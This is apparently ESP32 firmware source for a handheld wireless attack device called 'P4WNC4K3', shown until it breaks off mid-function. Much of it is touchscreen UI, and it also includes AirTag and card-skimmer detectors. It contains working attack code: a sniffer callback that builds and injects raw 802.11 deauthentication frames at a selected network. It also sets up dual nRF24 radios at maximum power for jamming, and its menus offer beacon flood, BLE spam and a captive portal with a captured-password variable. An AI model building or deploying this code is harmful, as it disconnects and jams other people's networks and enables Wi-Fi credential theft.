#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <TFT_eSPI.h>
#include <SPI.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_system.h"
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BLEAdvertising.h>
#include <RF24.h>

// TFT Display
TFT_eSPI tft = TFT_eSPI();

// DNS Server for Captive Portal
DNSServer dnsServer;
WebServer webServer(80);

// nRF24L01 Dual Module Setup
#define NRF1_CE_PIN  25
#define NRF1_CSN_PIN 26
#define NRF2_CE_PIN  27
#define NRF2_CSN_PIN 33
#define HSPI_MISO 12
#define HSPI_MOSI 13
#define HSPI_SCLK 14
#define COLOR_MATRIX_GREEN  0x07E0  // Bright Matrix green
#define COLOR_DARK_GREEN    0x0320  // Dark green for fade effect
#define COLOR_LIME          0x87F0  // Lime green accent

SPIClass hspi(HSPI);
RF24 radio1(NRF1_CE_PIN, NRF1_CSN_PIN);
RF24 radio2(NRF2_CE_PIN, NRF2_CSN_PIN);

// Network variables
String selectedSSID = "";
String capturedPassword = "";
bool portalActive = false;
int scanResults = 0;

// BLE Scanner
BLEScan* pBLEScan;
BLEAdvertising* pAdvertising;
int bleScanTime = 5;

// Console buffer
String consoleBuffer[15];
int consoleIndex = 0;

// Packet sniffer variables
bool snifferActive = false;
uint32_t packetCount = 0;
uint32_t beaconCount = 0;
uint32_t dataCount = 0;
uint32_t deauthCount = 0;
uint8_t snifferChannel = 1;

#define MAX_SNIFFER_PACKETS 100U

struct PacketInfo {
  uint8_t type;
  int8_t rssi;
  uint8_t channel;
  unsigned long timestamp;
};

PacketInfo packetHistory[MAX_SNIFFER_PACKETS];
int packetHistoryIndex = 0;
int snifferScrollOffset = 0;

// BLE Jammer variables
bool bleJammerActive = false;
unsigned long lastBLEJamTime = 0;
uint32_t bleJamPackets = 0;
String jammerModeText = "Random";

// nRF24 Jammer variables
bool nrfJammerActive = false;
bool dualNRFMode = true;
uint32_t nrfJamPackets = 0;
uint32_t nrf1Packets = 0;
uint32_t nrf2Packets = 0;
uint8_t nrfChannel = 2;
unsigned long lastNRFJamTime = 0;
bool nrf1Available = false;
bool nrf2Available = false;

// Animation variables (ADD THESE)
float skullX = 120;     // Center of 240 width
float skullY = 160;     // Center of 320 height
float skullVelX = 2;
float skullVelY = 1.5;
unsigned long lastAnimTime = 0;
bool showSkull = false;

bool continuousWiFiScan = false;
unsigned long lastWiFiScanTime = 0;
int scanDisplayOffset = 0;
const int MAX_DISPLAY_APS = 7;

bool continuousBLEScan = false;
unsigned long lastBLEScanUpdate = 0;

// AirTag/Apple Find My detection
struct AirTagDevice {
  String address;
  int rssi;
  unsigned long lastSeen;
  int detectionCount;
};
AirTagDevice airTags[20];
int airTagCount = 0;

// Card Skimmer Detection
struct SkimmerSignature {
  String name;
  int rssi;
  unsigned long detected;
};
SkimmerSignature skimmers[10];
int skimmerCount = 0;

// Menu states
enum MenuState {
  BOOT_ANIMATION,
  MAIN_MENU,
  WIFI_MENU,
  WIFI_SCAN,
  WIFI_ATTACK_MENU,
  BLE_MENU,
  BLE_SCAN_RESULTS,
  BLE_JAM_MENU,
  BLE_JAM_ACTIVE,
  NRF_JAM_MENU,
  NRF_JAM_ACTIVE,
  WIFI_BLE_NRF_JAM,
  AIRTAG_SCANNER,
  AIRTAG_RESULTS,
  SKIMMER_DETECTOR,
  SKIMMER_RESULTS,
  CAPTIVE_PORTAL_MENU,
  SNIFFER_MENU,
  SNIFFER_ACTIVE,
  WARDRIVING_MODE,
  SPAM_MENU,
  MORE_TOOLS_MENU,
  CONSOLE_VIEW
};

MenuState currentState = BOOT_ANIMATION;
MenuState previousState = MAIN_MENU;
int selectedIndex = 0;
int scrollOffset = 0;

// WiFi scan results storage
struct WiFiNetwork {
  String ssid;
  int32_t rssi;
  uint8_t channel;
  uint8_t bssid[6];
  bool isEncrypted;
  String encryption;
};

WiFiNetwork networks[50];
int networkCount = 0;

// BLE scan results
struct BLEResult {
  String address;
  String name;
  int rssi;
  String type;
};

BLEResult bleDevices[50];
int bleDeviceCount = 0;

// Attack variables
bool deauthActive = false;
bool beaconFloodActive = false;
bool appleSpamActive = false;
bool androidSpamActive = false;
unsigned long lastAttackTime = 0;
uint32_t deauthPacketsSent = 0;

// Wardriving
struct WardrivingData {
  int totalAPs;
  int openAPs;
  int securedAPs;
  String strongestSSID;
  int strongestRSSI;
};
WardrivingData wardrivingStats;

// Kali Linux inspired colors - DARKER theme
#define COLOR_BG        0x0000  // Pure Black
#define COLOR_HEADER    0x0208  // Very dark blue-grey
#define COLOR_TEXT      0xCE79  // Light grey text
#define COLOR_SELECTED  0x367F  // Kali blue highlight
#define COLOR_ITEM_BG   0x18C3  // Very dark grey
#define COLOR_BORDER    0x2945  // Dark border
#define COLOR_WARNING   0xFD20  // Orange
#define COLOR_SUCCESS   0x4E8A  // Muted green
#define COLOR_CRITICAL  0xC800  // Dark red
#define COLOR_ACCENT    0x367F  // Kali blue
#define COLOR_PURPLE    0x8012  // Dark purple

// UI Layout - Improved touch zones
#define SCREEN_WIDTH 240
#define SCREEN_HEIGHT 320
#define HEADER_HEIGHT 35
#define BUTTON_HEIGHT 45
#define BUTTON_SPACING 8
#define SIDE_MARGIN 12
#define BUTTON_WIDTH (SCREEN_WIDTH - (2 * SIDE_MARGIN))

// Forward declarations
void drawMainMenu();
void drawWiFiMenu();
void drawBLEMenu();
void drawSnifferMenu();
void drawAttackMenu();
void drawBLEJammerMenu();
void showMessage(const char* msg, uint16_t color);
void updateBLEJammerDisplay();

// Promiscuous mode callback for packet sniffing
void IRAM_ATTR wifiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
  
  packetCount++;
  
  uint8_t frameType = pkt->payload[0];
  
  // Store packet info for scrollable history
  packetHistory[packetHistoryIndex].type = frameType;
  packetHistory[packetHistoryIndex].rssi = pkt->rx_ctrl.rssi;
  packetHistory[packetHistoryIndex].channel = pkt->rx_ctrl.channel;
  packetHistory[packetHistoryIndex].timestamp = millis();
  packetHistoryIndex = (packetHistoryIndex + 1) % MAX_SNIFFER_PACKETS;
  
  if (frameType == 0x80) {
    beaconCount++;
    
    // AGGRESSIVE: If deauth is active, immediately send deauth when we see a beacon
    if (deauthActive) {
      bool isTarget = true;
      for (int i = 0; i < networkCount; i++) {
        if (networks[i].ssid == selectedSSID) {
          for (int j = 0; j < 6; j++) {
            if (pkt->payload[10 + j] != networks[i].bssid[j]) {
              isTarget = false;
              break;
            }
          }
          
          if (isTarget) {
            uint8_t deauthPacket[26] = {
              0xC0, 0x00, 0x00, 0x00,
              0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
              pkt->payload[10], pkt->payload[11], pkt->payload[12],
              pkt->payload[13], pkt->payload[14], pkt->payload[15],
              pkt->payload[10], pkt->payload[11], pkt->payload[12],
              pkt->payload[13], pkt->payload[14], pkt->payload[15],
              0x00, 0x00, 0x07, 0x00
            };
            
            esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
          }
          break;
        }
      }
    }
  }
  else if ((frameType & 0x0C) == 0x08) {
    dataCount++;
  }
  else if (frameType == 0xC0 || frameType == 0xA0) {
    deauthCount++;
  }
}

// BLE callback for AirTag and Skimmer detection
class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice advertisedDevice) {
    String address = advertisedDevice.getAddress().toString().c_str();
    String name = advertisedDevice.haveName() ? advertisedDevice.getName().c_str() : "";
    int rssi = advertisedDevice.getRSSI();
    
    // AirTag detection
    if (advertisedDevice.haveServiceUUID()) {
      if (address.startsWith("ff:ff:") || name.indexOf("AirTag") >= 0) {
        detectAirTag(address, rssi);
      }
    }
    
    // Card skimmer detection patterns
    if (name.indexOf("HC-") >= 0 || name.indexOf("BTM-") >= 0 || 
        name.indexOf("MLT-BT") >= 0 || rssi > -30) {
      detectSkimmer(name, rssi);
    }
  }
};

void animateSkull() {
  // Clear previous skull
  tft.fillRect(skullX - 12, skullY - 12, 24, 24, COLOR_BG);
  
  // Update position
  skullX += skullVelX;
  skullY += skullVelY;
  
  // Bounce off edges - PORTRAIT (240x320)
  if (skullX <= 15 || skullX >= 225) skullVelX = -skullVelX;
  if (skullY <= 45 || skullY >= 305) skullVelY = -skullVelY;
  
  // Draw new skull
  tft.setTextColor(0xFFFF);  // White
  tft.setTextSize(2);
  tft.setCursor(skullX - 10, skullY - 10);
  tft.print("X_X");
}

void detectAirTag(String address, int rssi) {
  bool found = false;
  for (int i = 0; i < airTagCount; i++) {
    if (airTags[i].address == address) {
      airTags[i].lastSeen = millis();
      airTags[i].rssi = rssi;
      airTags[i].detectionCount++;
      found = true;
      break;
    }
  }
  
  if (!found && airTagCount < 20) {
    airTags[airTagCount].address = address;
    airTags[airTagCount].rssi = rssi;
    airTags[airTagCount].lastSeen = millis();
    airTags[airTagCount].detectionCount = 1;
    airTagCount++;
  }
}

void detectSkimmer(String name, int rssi) {
  if (rssi > -35 && skimmerCount < 10) {
    bool duplicate = false;
    for (int i = 0; i < skimmerCount; i++) {
      if (skimmers[i].name == name) {
        duplicate = true;
        break;
      }
    }
    if (!duplicate) {
      skimmers[skimmerCount].name = name;
      skimmers[skimmerCount].rssi = rssi;
      skimmers[skimmerCount].detected = millis();
      skimmerCount++;
    }
  }
}

void setup() {
  Serial.begin(115200);
  
  // Initialize TFT
  tft.init();
  tft.setRotation(0);
  tft.fillScreen(COLOR_BG);
  pinMode(TFT_BL, OUTPUT);
  digitalWrite(TFT_BL, HIGH);
  
  // PROPER Touch Calibration - CRITICAL for accuracy
  // Run TFT_eSPI calibration sketch first to get YOUR screen's values
  // These are generic values - REPLACE with your actual calibration data
  uint16_t calData[5] = {275, 3620, 320, 3590, 4}; // [minX, maxX, minY, maxY, rotation]
  tft.setTouch(calData);
  
  // Initialize WiFi in Station mode
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  // Initialize nRF24L01 modules
  Serial.println("Initializing nRF24L01 modules...");
  hspi.begin(HSPI_SCLK, HSPI_MISO, HSPI_MOSI, -1);
  delay(50);

  esp_wifi_set_promiscuous(false);
  
  // Configure WiFi for raw packet injection
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();

  if (!SPIFFS.begin(true)) {
    Serial.println("SPIFFS Mount Failed");
    SPIFFS.format();
    SPIFFS.begin(true);
  }
  
  // Check if GIF exists
  if (!SPIFFS.exists("/boot.gif")) {
    Serial.println("boot.gif not found. Type 'upload' to upload via serial");
  }
  
  // Initialize Radio 1
  if (radio1.begin(&hspi)) {
    radio1.setAutoAck(false);
    radio1.setPALevel(RF24_PA_MAX);
    radio1.setDataRate(RF24_2MBPS);
    radio1.stopListening();
    radio1.setChannel(nrfChannel);
    nrf1Available = true;
    addToConsole("nRF24#1 initialized");
  } else {
    addToConsole("nRF24#1 init failed!");
  }
  
  // Initialize Radio 2
  if (radio2.begin(&hspi)) {
    radio2.setAutoAck(false);
    radio2.setPALevel(RF24_PA_MAX);
    radio2.setDataRate(RF24_2MBPS);
    radio2.stopListening();
    radio2.setChannel(nrfChannel + 25);
    nrf2Available = true;
    addToConsole("nRF24#2 initialized");
  } else {
    addToConsole("nRF24#2 init failed!");
  }
    
  if (nrf1Available && nrf2Available) {
    addToConsole("DUAL nRF24 mode ready!");
  } else if (nrf1Available || nrf2Available) {
    addToConsole("Single nRF24 mode");
    dualNRFMode = false;
  }
  
  // Boot animation
  playBootAnimation();
  
  addToConsole("P4WNC4K3 initialized");
  addToConsole("System ready for pentest");
  
  // Draw main menu
  currentState = MAIN_MENU;
  drawMainMenu();
}

// Add this color definition at the top with your other colors
#define COLOR_MATRIX_GREEN  0x07E0  // Bright Matrix green
#define COLOR_DARK_GREEN    0x0320  // Dark green for fade effect
#define COLOR_LIME          0x87F0  // Lime green accent

const char maskASCII[] PROGMEM = 
"cccccccccccahhhhhhaaaahhhhhaaccccccccccc\n"
"cccchacccccccccccccccccccccccccchhcccc\n"
"ccaccccccccccccccccccccccccccccccckcaccc\n"
"cchcccccccccccccccccccccccccccccccccchcc\n"
"cacccahhhhhhacccccccccccccchhhhhhhaccaac\n"
"chcchhhhhhhhhaccccccccccccahhhhhhhhhcchc\n"
"caccccccccahhhhhcccccccchhhhhaccccccccac\n"
"cacccccccccccahacccccccchhacccccccccccac\n"
"cccccccahaaaaachcccccccaacaaaaahacccccac\n"
"accccahhhhhhhhhhcaccccachhhhhhhhhhaccccc\n"
"acaaaahhhaaahhacchcccchccahaaaaahaaaaccc\n"
"acccccccccccccccahcccchccccccccccccccccc\n"
"accccccccccccccchhcccchhcccccccccccccccc\n"
"ccccccccccccccaaaacccchaaaccccccccccccac\n"
"caccccccccahhhccaaccccaccaahhcccccccccac\n"
"cachhhhhaccccccaahaccahaaccccccahhhhachc\n"
"chcchhahacccccccahhhahhccccccccahahaccac\n"
"ccacchhhhaacaaahhhhcchhhhaccachhahhcchcc\n"
"ccaccchhcahhhhhhhcckccahhhhhhhaahacccacc\n"
"ccchcccahacccccccccccccccccccaahaccchccc\n"
"cccchccccaccccccccaaaacccccccchccccacccc\n"
"cccccaacccacccccccahhcccccccccccchcccccc\n"
"cccccccaaccccccccchhhacccccccccaackccccc\n"
"ccccccccchcccccccchhhhcccccccahccccccccc\n"
"ccccccccccchcccccchhhhcccccahccccccccccc\n"
"cccccccccccccahcccahhcccchaccccccckccccc\n"
"ccccccccccccccccahhhhhhacccccccccckccccc\n";

// New boot animation function
void playBootAnimation() {
  tft.fillScreen(COLOR_BG);
  
  // Display mask and modules together
  displayIntegratedBoot();
  
  // Done - go to main menu
  currentState = MAIN_MENU;
}

void displayIntegratedBoot() {
  tft.fillScreen(COLOR_BG);
  
  // ===== SETUP: CALCULATE POSITIONS =====
  int lineCount = 27;
  int pixelsPerChar = 5;
  int totalMaskWidth = 40 * pixelsPerChar;  // 200px
  int totalHeight = lineCount * pixelsPerChar;  // 135px
  int maskStartY = 20;
  int maskStartX = (240 - totalMaskWidth) / 2;  // CENTER HORIZONTALLY: (240-200)/2 = 20
  
  // Parse lines
  char lines[27][50];
  int lineIndex = 0;
  int charIndex = 0;
  int linePos = 0;
  
  while (lineIndex < 27) {
    char c = pgm_read_byte(&maskASCII[charIndex]);
    if (c == '\0') break;
    
    if (c == '\n' || linePos >= 49) {
      lines[lineIndex][linePos] = '\0';
      lineIndex++;
      linePos = 0;
    } else {
      lines[lineIndex][linePos++] = c;
    }
    charIndex++;
    if (charIndex > 2000) break;
  }
  
  // ===== PART 1: DRAW STATIC MESSAGES FIRST =====
  int msgStartY = maskStartY + totalHeight + 15;
  
  // Title - Kali style console
  tft.setTextSize(1);
  tft.setTextColor(COLOR_MATRIX_GREEN);
  tft.setCursor(10, msgStartY);
  tft.println("root@p4wncak3:~#");
  msgStartY += 12;
  
  tft.drawLine(0, msgStartY, 240, msgStartY, COLOR_DARK_GREEN);
  msgStartY += 8;
  
  // Module initialization messages
  const char* modules[] = {
    "Initializing WiFi module...",
    "Initializing BLE scanner...",
    "Initializing nRF24 #1...",
    "Initializing nRF24 #2...",
    "Mounting SPIFFS...",
    "Initializing TFT display..."
  };
  
  for (int i = 0; i < 6; i++) {
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(10, msgStartY);
    tft.print("[");
    tft.setTextColor(COLOR_MATRIX_GREEN);
    tft.print("*");
    tft.setTextColor(COLOR_TEXT);
    tft.print("] ");
    tft.print(modules[i]);
    msgStartY += 12;
  }
  
  // ===== PART 2: ANIMATE SKULL WHILE UPDATING STATUS =====
  msgStartY = maskStartY + totalHeight + 15 + 20;  // Reset to first status position
  
  // Reveal map
  bool revealed[27][40];
  for (int y = 0; y < 27; y++) {
    for (int x = 0; x < 40; x++) {
      revealed[y][x] = false;
    }
  }
  
  int totalPixels = 0;
  for (int y = 0; y < 27; y++) {
    for (int x = 0; x < strlen(lines[y]); x++) {
      if (lines[y][x] != 'c') totalPixels++;
    }
  }
  
  // Slower random reveal animation
  int pixelsRevealed = 0;
  int animationSteps = 30;  // SLOWER: was 100, now 30 per frame
  int moduleIndex = 0;
  int pixelsPerModule = totalPixels / 6;  // Update status every 1/6 of completion
  
  while (pixelsRevealed < totalPixels) {
    for (int step = 0; step < animationSteps && pixelsRevealed < totalPixels; step++) {
      int randY = random(0, 27);
      int randX = random(0, 40);
      
      if (randX < strlen(lines[randY]) && !revealed[randY][randX]) {
        char pixel = lines[randY][randX];
        
        if (pixel != 'c') {
          revealed[randY][randX] = true;
          pixelsRevealed++;
          
          int xPos = maskStartX + (randX * pixelsPerChar);  // ADD HORIZONTAL OFFSET
          int yPos = maskStartY + (randY * pixelsPerChar);
          
          // Use different shades for depth
          uint16_t color;
          if (pixel == 'h') color = COLOR_MATRIX_GREEN;
          else if (pixel == 'a') color = COLOR_DARK_GREEN;
          else if (pixel == 'k') color = COLOR_LIME;
          else color = COLOR_MATRIX_GREEN;
          
          // Draw with 1px gap between blocks for definition
          tft.fillRect(xPos + 1, yPos + 1, pixelsPerChar - 2, pixelsPerChar - 2, color);
        } else {
          revealed[randY][randX] = true;
        }
      }
    }
    
    // Update module status as skull renders
    int currentModule = pixelsRevealed / pixelsPerModule;
    if (currentModule > moduleIndex && currentModule < 6) {
      int statusY = maskStartY + totalHeight + 15 + 20 + (moduleIndex * 12);
      tft.setTextColor(COLOR_SUCCESS);
      tft.setCursor(200, statusY);
      tft.println("OK");
      moduleIndex = currentModule;
    }
    
    delay(20);  // SLOWER: was 10ms, now 20ms
  }
  
  // Update remaining statuses
  for (int i = moduleIndex; i < 6; i++) {
    int statusY = maskStartY + totalHeight + 15 + 20 + (i * 12);
    if (i == 2 && !nrf1Available) {
      tft.setTextColor(COLOR_WARNING);
      tft.setCursor(190, statusY);
      tft.println("SKIP");
    } else if (i == 3 && !nrf2Available) {
      tft.setTextColor(COLOR_WARNING);
      tft.setCursor(190, statusY);
      tft.println("SKIP");
    } else {
      tft.setTextColor(COLOR_SUCCESS);
      tft.setCursor(200, statusY);
      tft.println("OK");
    }
    delay(100);
  }
  
  msgStartY = maskStartY + totalHeight + 15 + 20 + 72 + 3;
  
  // Title - Kali style console
  tft.setTextSize(1);
  tft.setTextColor(COLOR_MATRIX_GREEN);
  tft.setCursor(10, msgStartY);
  tft.println("root@p4wncak3:~#");
  msgStartY += 12;
  
  tft.drawLine(0, msgStartY, 240, msgStartY, COLOR_DARK_GREEN);
  msgStartY += 8;
  
  // Module initialization messages - Kali console style
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  
  // WiFi init
  tft.setCursor(10, msgStartY);
  tft.print("[");
  tft.setTextColor(COLOR_MATRIX_GREEN);
  tft.print("*");
  tft.setTextColor(COLOR_TEXT);
  tft.print("] Initializing WiFi module...");
  delay(150);
  tft.setTextColor(COLOR_SUCCESS);
  tft.setCursor(200, msgStartY);
  tft.println("OK");
  msgStartY += 12;
  
  // BLE init
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(10, msgStartY);
  tft.print("[");
  tft.setTextColor(COLOR_MATRIX_GREEN);
  tft.print("*");
  tft.setTextColor(COLOR_TEXT);
  tft.print("] Initializing BLE scanner...");
  delay(150);
  tft.setTextColor(COLOR_SUCCESS);
  tft.setCursor(200, msgStartY);
  tft.println("OK");
  msgStartY += 12;
  
  // nRF24 #1
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(10, msgStartY);
  tft.print("[");
  tft.setTextColor(COLOR_MATRIX_GREEN);
  tft.print("*");
  tft.setTextColor(COLOR_TEXT);
  tft.print("] Initializing nRF24 #1...");
  delay(150);
  if (nrf1Available) {
    tft.setTextColor(COLOR_SUCCESS);
    tft.setCursor(200, msgStartY);
    tft.println("OK");
  } else {
    tft.setTextColor(COLOR_WARNING);
    tft.setCursor(190, msgStartY);
    tft.println("SKIP");
  }
  msgStartY += 12;
  
  // nRF24 #2
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(10, msgStartY);
  tft.print("[");
  tft.setTextColor(COLOR_MATRIX_GREEN);
  tft.print("*");
  tft.setTextColor(COLOR_TEXT);
  tft.print("] Initializing nRF24 #2...");
  delay(150);
  if (nrf2Available) {
    tft.setTextColor(COLOR_SUCCESS);
    tft.setCursor(200, msgStartY);
    tft.println("OK");
  } else {
    tft.setTextColor(COLOR_WARNING);
    tft.setCursor(190, msgStartY);
    tft.println("SKIP");
  }
  msgStartY += 12;
  
  // SPIFFS
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(10, msgStartY);
  tft.print("[");
  tft.setTextColor(COLOR_MATRIX_GREEN);
  tft.print("*");
  tft.setTextColor(COLOR_TEXT);
  tft.print("] Mounting SPIFFS...");
  delay(150);
  tft.setTextColor(COLOR_SUCCESS);
  tft.setCursor(200, msgStartY);
  tft.println("OK");
  msgStartY += 12;
  
  // Display
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(10, msgStartY);
  tft.print("[");
  tft.setTextColor(COLOR_MATRIX_GREEN);
  tft.print("*");
  tft.setTextColor(COLOR_TEXT);
  tft.print("] Initializing TFT display...");
  delay(150);
  tft.setTextColor(COLOR_SUCCESS);
  tft.setCursor(200, msgStartY);
  tft.println("OK");
  msgStartY += 15;
  
  // Final separator line
  tft.drawLine(0, msgStartY, 240, msgStartY, COLOR_DARK_GREEN);
  msgStartY += 8;
  
  // System ready message - Kali style
  tft.setTextSize(1);
  tft.setTextColor(COLOR_LIME);
  tft.setCursor(10, msgStartY);
  tft.print("[");
  tft.setTextColor(COLOR_SUCCESS);
  tft.print("+");
  tft.setTextColor(COLOR_LIME);
  tft.print("] Pentesting suite initialized");
  msgStartY += 12;
  
  tft.setTextColor(COLOR_MATRIX_GREEN);
  tft.setCursor(10, msgStartY);
  tft.println("root@p4wncak3:~# ready");
  
  delay(1500);
}

void fadeToBlack() {
  for (int fade = 0; fade < 3; fade++) {
    tft.fillScreen(COLOR_BG);
    delay(30);
    tft.fillRect(0, 0, 240, 320, COLOR_DARK_GREEN);
    delay(30);
  }
  tft.fillScreen(COLOR_BG);
}

void addToConsole(String message) {
  consoleBuffer[consoleIndex] = message;
  consoleIndex = (consoleIndex + 1) % 15;
  Serial.println("[LOG] " + message);
}

// Improved header with better styling
void drawHeader(const char* title) {
  // Dark header bar
  tft.fillRect(0, 0, SCREEN_WIDTH, HEADER_HEIGHT, COLOR_HEADER);
  tft.drawLine(0, HEADER_HEIGHT-1, SCREEN_WIDTH, HEADER_HEIGHT-1, COLOR_ACCENT);
  
  // Title text
  tft.setTextColor(COLOR_TEXT);
  tft.setTextSize(2);
  tft.setCursor(10, 10);
  tft.println(title);
  
  // Small indicator on right
  tft.fillCircle(SCREEN_WIDTH - 15, 17, 4, COLOR_SUCCESS);
}

// Improved button drawing with better touch zones
void drawButton(const char* text, int index, int y, bool selected = false) {
  int x = SIDE_MARGIN;
  int w = BUTTON_WIDTH;
  int h = BUTTON_HEIGHT;
  
  if (selected || index == selectedIndex) {
    // Selected state
    tft.fillRect(x, y, w, h, COLOR_ACCENT);
    tft.drawRect(x, y, w, h, COLOR_TEXT);
    tft.setTextColor(COLOR_BG);
  } else {
    // Normal state
    tft.fillRect(x, y, w, h, COLOR_ITEM_BG);
    tft.drawRect(x, y, w, h, COLOR_BORDER);
    tft.setTextColor(COLOR_TEXT);
  }
  
  // Center text vertically
  tft.setTextSize(2);
  int textX = x + 10;
  int textY = y + (h - 16) / 2;
  tft.setCursor(textX, textY);
  tft.println(text);
}

void drawBackButton() {
  int y = SCREEN_HEIGHT - BUTTON_HEIGHT - 10;
  tft.fillRect(SIDE_MARGIN, y, BUTTON_WIDTH, BUTTON_HEIGHT, COLOR_CRITICAL);
  tft.drawRect(SIDE_MARGIN, y, BUTTON_WIDTH, BUTTON_HEIGHT, COLOR_WARNING);
  tft.setTextColor(COLOR_TEXT);
  tft.setTextSize(2);
  int textX = (SCREEN_WIDTH - 60) / 2;
  tft.setCursor(textX, y + 14);
  tft.println("< BACK");
}

void showMessage(const char* msg, uint16_t color) {
  int boxW = 200;
  int boxH = 60;
  int boxX = (SCREEN_WIDTH - boxW) / 2;
  int boxY = (SCREEN_HEIGHT - boxH) / 2;
  
  tft.fillRect(boxX, boxY, boxW, boxH, COLOR_HEADER);
  tft.drawRect(boxX, boxY, boxW, boxH, color);
  tft.drawRect(boxX+1, boxY+1, boxW-2, boxH-2, color);
  
  tft.setTextSize(1);
  tft.setTextColor(color);
  tft.setCursor(boxX + 10, boxY + 25);
  tft.println(msg);
  delay(2000);
}

// PART 2/3 - Menu Drawing and Touch Handling Functions
// This continues from Part 1

void drawMainMenu() {
  tft.fillScreen(COLOR_BG);
  drawHeader("MAIN MENU");
  
  int y = HEADER_HEIGHT + 15;
  drawButton("WiFi Tools", 0, y);
  y += BUTTON_HEIGHT + BUTTON_SPACING;
  drawButton("Packet Sniffer", 1, y);
  y += BUTTON_HEIGHT + BUTTON_SPACING;
  drawButton("Bluetooth", 2, y);
  y += BUTTON_HEIGHT + BUTTON_SPACING;
  drawButton("More Tools", 3, y);
}

void drawWiFiMenu() {
  tft.fillScreen(COLOR_BG);
  drawHeader("WIFI TOOLS");
  
  int y = HEADER_HEIGHT + 10;
  drawButton("Scan Networks", 0, y);
  y += BUTTON_HEIGHT + BUTTON_SPACING;
  drawButton("Deauth Attack", 1, y);
  y += BUTTON_HEIGHT + BUTTON_SPACING;
  drawButton("Beacon Flood", 2, y);
  y += BUTTON_HEIGHT + BUTTON_SPACING;
  drawButton("Captive Portal", 3, y);
  
  drawBackButton();
}

void drawBLEMenu() {
  tft.fillScreen(COLOR_BG);
  drawHeader("BLUETOOTH");
  
  int y = HEADER_HEIGHT + 10;
  int startIndex = scrollOffset;
  int menuItems = 7;
  int visibleItems = 4;
  
  const char* menuLabels[] = {
    "Scan BLE",
    "BLE Jammer", 
    "BLE Spam",
    "AirTag Scan",
    "nRF24 Jammer",
    "Combined Jam",
    "More BLE >>"
  };
  
  for (int i = 0; i < visibleItems && (startIndex + i) < menuItems; i++) {
    drawButton(menuLabels[startIndex + i], i, y);
    y += BUTTON_HEIGHT + BUTTON_SPACING;
  }
  
  if (menuItems > visibleItems) {
    tft.setTextColor(COLOR_PURPLE);
    tft.setTextSize(1);
    tft.setCursor(SCREEN_WIDTH / 2 - 20, y + 5);
    tft.printf("Page %d/%d", (startIndex / visibleItems) + 1, (menuItems + visibleItems - 1) / visibleItems);
  }
  
  drawBackButton();
}

void drawBLEJammerMenu() {
  tft.fillScreen(COLOR_BG);
  drawHeader("BLE JAMMER");
  
  int y = HEADER_HEIGHT + 10;
  drawButton("Start Jammer", 0, y);
  y += BUTTON_HEIGHT + BUTTON_SPACING;
  drawButton("Stop Jammer", 1, y);
  
  y += BUTTON_HEIGHT + 20;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.print("Mode: ");
  tft.setTextColor(COLOR_ACCENT);
  tft.println(jammerModeText);
  
  y += 15;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.print("Status: ");
  tft.setTextColor(bleJammerActive ? COLOR_WARNING : COLOR_SUCCESS);
  tft.println(bleJammerActive ? "ACTIVE" : "STOPPED");
  
  drawBackButton();
}

void drawSnifferMenu() {
  tft.fillScreen(COLOR_BG);
  drawHeader("SNIFFER");
  
  int y = HEADER_HEIGHT + 10;
  drawButton("Start Sniffer", 0, y);
  y += BUTTON_HEIGHT + BUTTON_SPACING;
  drawButton("Stop Sniffer", 1, y);
  
  y += BUTTON_HEIGHT + 20;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.print("Channel: ");
  tft.setTextColor(COLOR_ACCENT);
  tft.print(snifferChannel);
  
  y += 15;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.print("Status: ");
  tft.setTextColor(snifferActive ? COLOR_WARNING : COLOR_SUCCESS);
  tft.println(snifferActive ? "ACTIVE" : "STOPPED");
  
  y += 15;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.printf("Packets: %d", packetCount);
  
  drawBackButton();
}

void drawMoreToolsMenu() {
  tft.fillScreen(COLOR_BG);
  drawHeader("MORE TOOLS");
  
  int y = HEADER_HEIGHT + 10;
  drawButton("Skimmer Detect", 0, y);
  y += BUTTON_HEIGHT + BUTTON_SPACING;
  drawButton("Wardriving", 1, y);
  y += BUTTON_HEIGHT + BUTTON_SPACING;
  drawButton("Console", 2, y);
  
  drawBackButton();
}

void drawAttackMenu() {
  tft.fillScreen(COLOR_BG);
  drawHeader("ATTACK MODE");
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_ACCENT);
  tft.setCursor(SIDE_MARGIN, HEADER_HEIGHT + 8);
  tft.print("Target: ");
  tft.setTextColor(COLOR_WARNING);
  String displaySSID = selectedSSID;
  if (displaySSID.length() > 28) displaySSID = displaySSID.substring(0, 28);
  tft.println(displaySSID);
  
  int y = HEADER_HEIGHT + 35;
  drawButton("Start Deauth", 0, y);
  y += BUTTON_HEIGHT + BUTTON_SPACING;
  drawButton("Stop Attack", 1, y);
  
  y += BUTTON_HEIGHT + 20;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
